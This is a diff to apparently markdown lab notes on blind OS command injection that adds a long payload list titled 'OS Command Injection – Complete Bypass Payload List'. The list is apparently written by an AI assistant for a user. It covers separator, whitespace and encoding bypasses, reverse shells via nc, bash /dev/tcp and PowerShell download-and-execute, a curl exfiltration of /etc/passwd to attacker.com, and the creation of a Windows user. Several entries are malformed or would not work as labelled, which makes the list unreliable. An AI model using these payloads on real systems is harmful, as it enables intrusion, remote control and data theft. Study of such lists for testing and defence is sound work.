@@ -494,3 +494,318 @@ We get the username “peter-5fYwD0” after a GET to "/image?filename=whoami.tx
 
 ![img](images/22%20-%20Blind%20OS%20command%20injection%20with%20output%20redirection/8.png)
 
+
+Below is the **OS Command Injection – Complete Bypass Payload List**, written in the **same format** as your previous ones (Host Header / CORS / XXE / SSRF / HTTP Request Smuggling).
+
+This includes **classic payloads, blind payloads, filter bypass, encoding bypass, separator bypass, function-based bypass, chained injections**, and **real exploitation payloads used in red-team & bug bounty**.
+
+---
+
+# ⭐ **OS Command Injection – Complete Bypass Payload List**
+
+---
+
+# **1. Core Command Injection Payloads**
+
+### **Basic Injection**
+
+```
+; whoami
+&& whoami
+| whoami
+```
+
+### **Append Commands**
+
+```
+test; id
+test && id
+test | id
+```
+
+---
+
+# **2. Conditional Execution**
+
+```
+test || whoami
+1 & whoami
+```
+
+---
+
+# **3. Chained Injection Payloads**
+
+```
+whoami; uname -a
+id && cat /etc/passwd
+```
+
+---
+
+# **4. Blind Command Injection Payloads**
+
+### **Time Delay**
+
+```
+; sleep 5
+&& ping -c 5 127.0.0.1
+| timeout 5
+```
+
+### **Out-of-Band (DNS/HTTP)**
+
+```
+; nslookup attacker.com
+; curl http://attacker.com/`whoami`
+```
+
+---
+
+# **5. Special Character Bypass Payloads**
+
+### **Common Separators**
+
+```
+; id
+& id
+&& id
+| id
+|| id
+%0a id
+%26 id
+```
+
+### **Whitespace Bypass**
+
+```
+${IFS}id
+$IFS$id
+id%09
+id$IFS
+```
+
+---
+
+# **6. Environment Variable Bypass**
+
+```
+${PATH}
+$(whoami)
+${HOME}
+`id`
+```
+
+---
+
+# **7. Subshell Execution Bypass**
+
+```
+`id`
+$(id)
+$((id))
+```
+
+---
+
+# **8. Encoding Bypass Payloads**
+
+### **URL Encoded**
+
+```
+%3Bcat%20/etc/passwd
+%26whoami
+```
+
+### **Double URL Encoding**
+
+```
+%253Bcat%2520/etc/passwd
+```
+
+### **Base64 Execution**
+
+```
+echo cGluZyAtYyAxIDx3aG9hbWk+Cg== | base64 -d | bash
+```
+
+---
+
+# **9. Space Bypass Techniques**
+
+### **Using IFS**
+
+```
+cat${IFS}/etc/passwd
+ls${IFS}-la
+```
+
+### **Using Tabs**
+
+```
+cat	/etc/passwd
+```
+
+### **Using $IFS$9**
+
+```
+cat$IFS$9/etc/passwd
+```
+
+---
+
+# **10. Command Injection via File Write**
+
+```
+; echo 'malware' > /tmp/pwned
+```
+
+---
+
+# **11. Command Injection via Pipes**
+
+```
+| curl http://attacker.com/`hostname`
+| nc attacker.com 4444 -e /bin/sh
+```
+
+---
+
+# **12. Restricted Character Bypass**
+
+### **Using Wildcards**
+
+```
+ls /etc/pas*wd
+c?t /etc/passwd
+```
+
+### **Using Hex Encoding in Bash**
+
+```
+$'\x69\x64'
+```
+
+---
+
+# **13. Filter Bypass via Command Substitution**
+
+```
+a=$(id)
+a=`id`
+```
+
+---
+
+# **14. Using Built-In Shell Variables**
+
+```
+$0
+$$
+$UID
+$USER
+```
+
+---
+
+# **15. Using Shorthand Commands**
+
+```
+id<1
+id>1
+id<>1
+```
+
+---
+
+# **16. Exploit Without Spaces (Fully Space-less)**
+
+```
+{cat,/etc/passwd}
+cat</etc/passwd
+bash<<<id
+```
+
+---
+
+# **17. Filename-Based Execution (Linux)**
+
+```
+/bin/bash -c id
+/bin/sh -c id
+```
+
+---
+
+# **18. Command Injection in Arguments**
+
+```
+ping -c 1 google.com;id
+python3 -c "import os;os.system('id')"
+```
+
+---
+
+# **19. Windows Command Injection Payloads**
+
+### **Basic**
+
+```
+& whoami
+| whoami
+&& whoami
+```
+
+### **File Read**
+
+```
+type C:\Windows\System32\drivers\etc\hosts
+```
+
+### **Add User**
+
+```
+net user hacked Pass123! /add
+```
+
+### **Reverse Shell**
+
+```
+powershell -NoP -W hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"
+```
+
+---
+
+# **20. Advanced Payloads (Real-World Pentest)**
+
+### **Reverse Shell (Linux)**
+
+```
+bash -i >& /dev/tcp/attacker.com/4444 0>&1
+```
+
+### **Data Exfiltration**
+
+```
+curl -X POST -d "@/etc/passwd" http://attacker.com/upload
+```
+
+### **Command Obfuscation**
+
+```
+$(echo aWQ= | base64 -d)
+```
+
+### **Polyglot Injection**
+
+```
+;id|id&whoami$(id)
+```
+
+### **Double Subshell**
+
+```
+$($(whoami))
+```
+
+---
